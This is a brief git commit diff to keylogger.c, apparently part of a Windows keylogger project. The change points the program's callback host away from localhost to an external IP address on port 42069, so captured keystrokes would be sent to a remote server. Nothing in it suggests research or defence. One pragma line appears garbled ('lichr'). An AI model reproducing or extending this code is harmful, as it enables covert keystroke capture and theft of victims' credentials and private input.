c779912fb241fa4b5510df98fe62c16f5635e198
unknown <amirsil2002@gmail.com>
2020-07-10 16:29:50 +0300

    Changed host to connect to, fixed server.py stdout

--- keylogger.c
+++ keylogger.c
@@ -7,7 +7,7 @@
 #include <winsock2.h>
 #pragma comment(lichr, "ws2_32.lichr")
 #define PORT 42069
-#define HOST "127.0.0.1"
+#define HOST "128.61.240.205"
 
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
